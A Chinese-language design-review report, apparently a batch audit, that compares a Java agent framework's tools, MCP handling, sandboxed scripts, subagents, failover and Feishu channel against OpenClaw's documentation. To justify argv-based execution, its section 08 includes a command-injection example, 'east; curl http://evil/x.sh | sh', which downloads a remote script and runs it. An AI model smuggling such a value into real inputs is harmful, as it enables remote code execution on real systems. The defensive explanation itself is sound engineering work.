# batch B：m2（能力与技能 / 真模型 / 收尾）

## m2-capability-and-skills

### 01 工具装配改成收集所有 ToolCallback —— 三层能力的共同入口
- 判定：一致
- 代码证据：`claw4j-agent/src/main/java/io/github/claw4j/agent/AgentAutoConfiguration.java:274-277`（单 `ToolCallback` 与 `ToolCallbackProvider` 两路都收进同一个列表，不再按"单个 provider 缺失"判条件）
- 代码证据：`claw4j-app/src/test/java/io/github/claw4j/app/ApplicationAssemblyTest.java:448-450`（清单里同时有 `querySales` / `systemStatus` / `get_goal`，少一个就红）；`ToolCallBudget.java:51,60`（3 / 6 仍是默认）
- OpenClaw：`docs/tools/tool-search.md:79-85`（一轮开始时把 OpenClaw、plugin、MCP、client 四类工具收成同一份 effective catalog）
- 一句：多来源汇成一份清单的口径一致；P09 之后模型默认只经 `ToolSearch` 检索，票面说的"模型可见清单"已收窄成 catalog，这是后续票的演进，不是来源互相挤掉。

### 02 MCP 跨进程闭环
- 判定：不一致（真偏差，不是"故意不同"）
- 我们：`McpToolProvider.java:48-55`（建 bean 时 `listTools()` 为空直接抛，应用起不来）；`McpConnection.java:149,162,201`（只在调用中认 `McpTransportSessionNotFoundException`，关旧连接重开一次并重放）
- 代码证据：`ProcessStdioMcpEndpoint.java:145`（今天已有真实子进程 stdio 端点，票面 Answer 里"OS 进程那条边界没有真起"已不成立）
- OpenClaw：`docs/tools/mcp.md:61` 原文——"When OpenClaw's built-in MCP client cannot start a server, it retries with exponential backoff: 30 seconds, doubling up to 10 minutes. … After a startup failure, turns never wait for retries: recovery runs in the background, and recovered tools become available at the next turn boundary."；`docs/tools/mcp.md:44-45`——"keeps its last successfully listed tools and utilities in the session's model-facing catalog while recovery runs in the background"
- 例子：第三方 server 升级重启 40 秒。它的做法：这一轮照常答，只是那家的工具暂时看不见，40 秒后下一轮自动回来，说明里挂一条"该 server 不可用"。我们的做法：应用**起不来**；在 K8s 上表现为 CrashLoopBackOff，重试由编排层做，日志里只有一行 MCP 连接失败——而 HTTP 通道也被一起带下线。
- 对齐要改什么（成本：中偏大）：`AgentAutoConfiguration#collectToolCallbacks` 是启动时把 `ToolCallbackProvider` 收成一份快照，`ChatClient` 也是单例；要让"恢复后的工具在下一轮生效"，得把工具清单改成按轮解析 + 一个后台重试与"不可用"占位的注册表。不是补一个 catch 能完事的。

### 03 Script Package 受限执行
- 判定：自研
- 代码证据：`SandboxPolicy.java:55-58,66-75,88-95,118-149`（环境只有 `PATH`、超时上限 30 秒且不夹取、拒绝 root、`resolveInside` 挡 `..` 与符号链接）
- 代码证据：`ScriptPackageRunner.java:116`（只把 stdout 交回）；`ScriptPackageToolProvider.java:39,88`（动作 `run_script`，零业务表）；`BuildContractTest.java:83-89`（除 `LocalProcessRunner` 外全仓禁 `ProcessBuilder` / `Runtime.exec`）
- OpenClaw：无对应物（脚本包这一形态；OpenClaw 只有 `exec` + 容器/宿主沙箱，见 `docs/tools/exec.md:9`）
- 一句：这是本项目自定的"应用容器内受限子进程 + 四条策略"，与 OpenClaw 的 `exec` 沙箱不是同一形态，不算偏差。

### 04 Agent Skills 渐进式披露
- 判定：一致
- 代码证据：`AgentSkills.java:63-73`（直接用社区 `SkillsTool.builder().build()` 返回的 `ToolCallback`，不再包一层工具类型）
- 代码证据：`SkillCatalogTest.java:82-92`（工具描述里只有元数据，正文一个字都不进）；`:93-104`（按名字调用之后正文才回来一次）
- OpenClaw：`docs/tools/skills.md:887-890`（搜索结果只有 name/location/缩短描述，不含 instructions；`skills_read` 才加载完整 `SKILL.md`）
- 一句：渐进式披露的口径一致——清单只给元数据，正文按需取一次。

### 05 Subagent 编排
- 判定：一致
- 代码证据：`SubagentRunner.java:108-134`（每次委派新建 builder，只 `.content()` 回传）；`SubagentDefinition.java:119-125`（白名单筛选，黑白名单冲突按定义错误）
- 代码证据：`SubagentDelegationTest.java:239-272`（只回传结论，子窗口工具明细不进父；委派不提权）
- OpenClaw：`docs/tools/subagents.md:13-20`（独立 session、只 `announce` 结果、默认隔离）；`docs/tools/subagents/tool-policy.md:11-13`（同一 policy 管线后再套子代理限制层）
- 一句：上下文隔离 + 工具白名单 + 父子同一份预算，口径一致。

### 06 Skill Generator 五步链路
- 判定：自研
- 代码证据：`SkillGeneratorTest.java:63-72`（静态检查在落盘之前挡下并留审计）；`:90-95`（五步走完停在"待人工审核"）；`:179-190`（自测跑临时副本、超时落到进程）
- 代码证据：`SkillGenerator.java:253-278`（读 `ReviewGate` 决策，摘要不匹配不注册）；`SkillGeneratorToolProvider.java:14-17`（`propose_script` 的动作是 `draft_script`）
- OpenClaw：无同形对应物（`docs/tools/skill-workshop.md:15` 是"自动生效 + 可撤销"，没有静态检查、沙箱自测、人审这三步）
- 一句：五步人审链路是本项目自定的玩法；票面已把"网络受限/资源上限给不了"记成 `NOT_ISOLATED`，属自研而非偏差。

### 07 场景迁移、文档收尾与真实模型联调
- 判定：不一致
- 代码证据：`examples/README.md:12`（三个脚本包与 MCP 示例仍在）；`docs/design/capability-layers.md:299-315`（真模型 curl 实录仍在，但从 README 挪到了设计文档）
- 代码证据：`claw4j-capability/src/main/java/io/github/claw4j/capability/builtin/system/SystemStatusTools.java:26`（一层 `system-status` 仍在）；`examples/README.md:50-52`（`McpDemoConfiguration` / `mcp-demo` profile 是有记录地删掉的，不算失守）
- 未找到证据：`BudgetAcrossLayersTest`、`PermissionsAcrossLayersTest` 全仓 0 命中（两条都不在测试目录里，也没有替代的跨层用例）。
- OpenClaw：无对应物（本项目的场景迁移与文档收尾，不是 OpenClaw 概念）
- 一句：三层示例与实录还在，但票面用来钉住"三层共用预算/鉴权"的两条测试今天不存在，"复核覆盖三层"这一条承诺没有回归守着。

### 08 脚本层改成结构化 argv
- 判定：自研（OpenClaw 没有"声明式脚本包"这个形态，用例子说明为什么不能照抄它的 `exec`）
- 代码证据：`ProcessRequest.java:27`（`record ProcessRequest(List<String> argv, long timeoutMillis)`，没有 command 字符串、也没有 env 入口）；`LocalProcessRunner.java:59`（`new ProcessBuilder(request.argv())`，数组直接交给进程）
- 代码证据：`ScriptStaticCheck.java:41,184-185`（`NO_SHEBANG` 挡在落盘之前）；`BuildContractTest.java:84-89`（红线收窄到 `LocalProcessRunner` 一个类，而不是删掉）
- OpenClaw：`docs/tools/exec.md:54-55`（`exec` 的 `command` 是 "Shell command to run"）——但那是**通用 shell 工具**：模型直接写一条命令，沙箱、审批、IO 配额都在那一层。我们没有这个能力（ADR-0002 明确不做），我们的东西是"预先声明的脚本 + 声明过的参数"。
- 例子：脚本包 `report.sh` 收一个 `--region` 参数，值由模型给。走 shell 时，模型写 `east; curl http://evil/x.sh | sh`，分号后面那段会被执行；argv 直执时它只是 `--region` 的一个取值，脚本自己的参数校验会拒掉。**同一句模型输出，一条路是数据，另一条路是命令。** 这就是为什么这条不能"照 OpenClaw 那样收字符串"——它那边的字符串本来就该被解释，我们这边的参数是业务数据。
- 一句：形态不同（通用 shell vs 声明式脚本包），不是"我们选了个更严的写法"；`argv` 是这条形态的必然结果，不是偏好。

## m2-real-model-testing

### 01 删掉两个假模型类，需要模型的测试全部连真实 DeepSeek
- 判定：已过期
- 代码证据：`RealChatModelCondition.java:64-69`（一家 key 都没有时仍 match，交给装配方法 fail fast——"删 mock、无 key 起不来"这条还成立）
- 代码证据：`SessionMemoryTest.java:187`（会话记忆已改回 `FixedChatModel`）；`README.md:412`（门禁"跑的是假模型与真容器"）
- 未找到证据：`RealModelSupport` / `RealModelTest` / `.github/workflows` 全仓 0 命中；`ChatPipelineTest.java:237-239` 只剩一条真模型用例。
- OpenClaw：无对应物（测试策略是内部工程决策）
- 一句：票面要的"需要模型的测试全部连真实 DeepSeek + CI 接 secret"今天已被后续路线推翻，只剩删 mock 与无 key 失败两条还成立。

## m2-closeout

### 01 子 Agent 白名单：空结果不再等于全部权限
- 判定：自研
- 代码证据：`SubagentDefinition.java:170-184`（写了 `tools` 但解析不出名字 → `IllegalStateException`；没写这一节 → 空名单＝继承全部）
- 代码证据：`SubagentDelegationTest.java:362-375`（逐行列表、逗号、方括号三种写法一致；空节拒绝）
- OpenClaw：无对应物（子代理工具策略走 `docs/tools/subagents/tool-policy.md:11-13` 的配置管线，不解析 markdown 的 `tools:` front matter）
- 一句：这是本项目 front matter 解析的语义修正（`FrontMatter` 已从包内类提升到 `claw4j-core` 的 `markdown` 包），OpenClaw 没有同形物。

### 02 行上限包装不把合法 SQL 变成语法错误
- 判定：自研
- 代码证据：`SalesSqlGuard.java:107-114`（包成子查询之前补 `\n`，行注释不会把 `) as claw4j_limited limit N` 吞掉）
- 代码证据：`SalesQueryTest.java:170,185`（真库上断言行注释结尾仍出数；`order by ... limit 2` 证明是外层再包一层）
- OpenClaw：无对应物（没有内置 Text-to-SQL 工具；schema 里也没有行上限字段）
- 一句：本项目 SQL 守卫的自研修正，与 OpenClaw 无可比口径。

### 03 主备降级只发生在可重试失败上
- 判定：一致
- 代码证据：`ModelFailures.java:46-73`（沿 cause 链认 `Transient` / `NonTransient` / OpenAI 状态码，429 与 5xx 才换家）；`RoutingChatModel.java:71-73,96-104`（同步与流式都只消费这一处判断）
- 代码证据：`ModelAndToolSelectionTest.java:288-318`（401 不降级且备一次不碰；15 种失败的表驱动）
- OpenClaw：`docs/concepts/model-failover.md:16-20`（认证失败/额度等先轮换凭据，只有未知/下线模型才推进 fallback）；`packages/gateway-protocol/src/failover-reasons.ts:1-4`（闭合的失败原因词表）、`schema/failover-reason.ts:1-9`（词表做成 union schema）
- 一句：都是"只有换一家可能好才降级"，确定性错误不扩散；口径一致。

### 04 飞书入站调度：去重 → 立刻 ACK → 异步执行 → 回推
- 判定：不一致（真偏差，不是"故意不同"）
- 我们：`claw4j-core/src/main/java/io/github/claw4j/channel/kernel/InboundDispatcher.java:202-232`（`accept` 只去重、认人、投 executor，返回即 ACK）；`:212`（同 `eventId` 只 ACK 不执行）；去重表是**进程内 TTL**，不落库
- 代码证据：`InboundDispatchTest.java:76-164`（ACK 早于 Agent；重复投递只跑一次；过窗重跑）
- OpenClaw：`docs/channels/feishu/setup.md:43`——"durably queues authenticated `im.message.receive_v1` … envelopes **before** agent dispatch … Pending or retryable events survive a Gateway restart … use Feishu's event ID to suppress duplicate queue entries"；`:45`——"If a WebSocket event cannot be persisted after bounded retries, OpenClaw closes that socket … instead of continuing past an uncommitted turn."
- 例子：发版窗口内进程重启。飞书已经收到我们的 ACK、不会重投；那条消息只在内存里，随进程消失——**用户的消息永久丢失**，日志里只留下"已提交到执行线程池"。同样这一秒，OpenClaw 的部署把它留在队列里，重启后接着跑完。差别不是"去重表放哪儿"，是"这条消息是不是已经没人负责了"。
- 对齐要改什么（成本：大）：一张持久表（`event_id` 唯一 + 状态 + 每对话一个序号），改成"先落库再 ACK、执行完标完成、启动时扫未完成并按对话串行"。落不了库要像它那样断开连接、不越过未提交的一轮。
- 一句：ACK/去重/异步/回推的骨架一致，但**持久性没有**——今天这套在崩溃时丢消息，而这一条正是票面"不引 Redis，单实例是既定形态"顺手带过去的。

### 05 飞书长连接接上真 SDK，关掉 M2
- 判定：不一致（真偏差；但"凭据错就失败"这一半与 OpenClaw 一致）
- 我们：`FeishuLongConnectionChannel.java:113-121`（`start()` + `awaitReady`，**超时或异常一律直接抛**，应用起不来）；`FeishuChannelAutoConfiguration.java:44-46,67-68`（SDK 在 classpath、凭据齐、`enabled` 才装配）
- 代码证据：`FeishuChannelWiringTest.java:57-90`（缺凭据/半配/SDK 不在 classpath/`enabled=false` 四种退让）
- OpenClaw：`docs/channels/slack/transports.md:71`——"Recoverable start, start-wait, and disconnect failures **retry until the channel stops**. Permanent account and credential errors such as invalid auth, revoked tokens, or missing scopes **fail fast** instead of retrying forever."（飞书的通道页没有写"连不上就起不来"，只写状态探测 `channels status --probe`）
- 例子：App ID 写错（永久错误）→ 不该无限重试、要立刻把错误报出来，这条我们和它一致。换成对端暂时不可用（飞书侧限流、本机 DNS 抖动、长连接建到一半超时）→ 我们**同样**整个进程退出：K8s 上是 CrashLoopBackOff，**连 HTTP 通道也一并不可用**；OpenClaw 起得来，只是这一路未连接，`channels status --probe` 报状态，别的通道照常收消息。
- 对齐要改什么（成本：小偏中）：把"抛"拆成两类——凭据/配置类（永久）继续抛；连接超时、握手失败、后续断开走后台退避重连 + 状态上报。`start()` 的 `try/catch` 已经在那里，是把 catch 里的 `throw` 换成一个可重试的状态机，不需要动装配条件。
- 一句：**"永远不降级"和"一律失败"不是一回事**；OpenClaw 分的是"不可恢复"与"可恢复"，我们现在把两类都判成了不可恢复。

### 06 文档与限制记账对齐
- 判定：一致（评审当天记的偏差已在 `a6c8fda` 修掉）
- 代码证据：`docs/adr/0010-module-layering-and-dependency-direction.md:49`（现在是 `CoreBoundariesTest`）、`docs/adr/0015-one-core-artifact.md:70-71`（两个都叫 `CoreBoundariesTest` / `CoreBoundaryTest`，与代码里一致）
- 代码证据：`docs/adr/0009-channel-selection-feishu-long-connection.md:45-53`（实现记录在）；`docs/agents/guardrails.md:37`（SDK 无单测的偏差在）；`README.md:367`（FEISHU 配置行在）
- OpenClaw：无对应物（内部 ADR/文档记账）
- 一句：五条验收今天全在——第 5 条当时被 ADR-0015 的重构打破（ADR-0010 还指向 `DomainBoundaryTest`），已随死指针清理一起修正。

### 07 文档不该点测试类名，只该说"这条要有测试守着"
- 判定：不一致（死指针已清零，但类名仍大量存在）
- 代码证据：`docs/capability-tests.md:106`（`ApprovalFlowTest` / `ApprovalControllerTest` 这类写法仍在，17 处）
- 复扫证据（2026-11-08，排除 `docs/adr/` 与两份评审报告这类"记录"）：`docs/` + `README.md` + `GLOSSARY.md` 里 `*Test` / `*IT` 记号 **28 处**，最大头是 `docs/capability-tests.md`（17）。票面要的"0 处"今天不存在。
- OpenClaw：无对应物（文档卫生是本项目内部约束）
- 一句：`DomainBoundaryTest` 这个**死指针**已经没了（`a6c8fda`），但"文档只描述要有什么测试、不点类名"这条承诺今天仍不成立——改一个类名就多一处过期指针，这次的 `DomainBoundaryTest` 就是这么来的。

## 本批小结
- 一致 5：01（多来源工具收集）、04（技能渐进披露）、05（子代理隔离与白名单）、closeout-03（降级分类）、closeout-06（ADR 指针，评审当天记的偏差已修）。
- 自研 5：03（脚本包沙箱）、06（技能生成五步链）、08（argv 直执，无对应形态）、closeout-01（front matter 白名单解析）、closeout-02（SQL 行上限包装）。
- **故意不同 0**：这一档不再用来装"和 OpenClaw 不一样、但我们有理由"的东西。和它不一样就是偏差（不一致），
  它没有这个东西就是自研——那要用例子说清，不能反过来拿"我们有理由"当结论。
- 不一致 5：
  - **capability-02**（MCP）：启动即失败 vs 后台退避重试 30 秒→10 分钟 + 保留上次成功列出的工具
  - **closeout-04**（入站）：进程内 TTL 去重 + 先 ACK vs 持久队列 + 先落库
  - **closeout-05**（通道连接）：一律抛 vs 只有永久错误才失败、可恢复的后台重连
  - capability-07（`BudgetAcrossLayersTest` / `PermissionsAcrossLayersTest` 不存在，"三层共用预算/鉴权"没有回归守着）
  - closeout-07（docs 里仍有 28 处测试类名；死指针已清零）
- 已过期 1：real-model-01（真模型回归基线被推翻，门禁改回替身且无 CI）。

- 按代价排序的下一步
  1. **closeout-05（最小）**：把"抛"拆成两类——凭据/配置类继续失败，连接超时与断开走后台退避重连 + 状态上报。
     `start()` 的 `try/catch` 已经在那儿，换的是 catch 里的动作，不动装配条件。
  2. **capability-02（中偏大）**：工具清单从启动快照改成按轮解析，加一个后台重试与"不可用"占位的注册表。
  3. **closeout-04（最大）**：入站持久表 + 先落库再 ACK + 启动扫未完成 + 按对话串行。
  4. 文档指针（最便宜，可随手）：docs 正文里 28 处测试类名（`capability-tests.md` 占 17）。
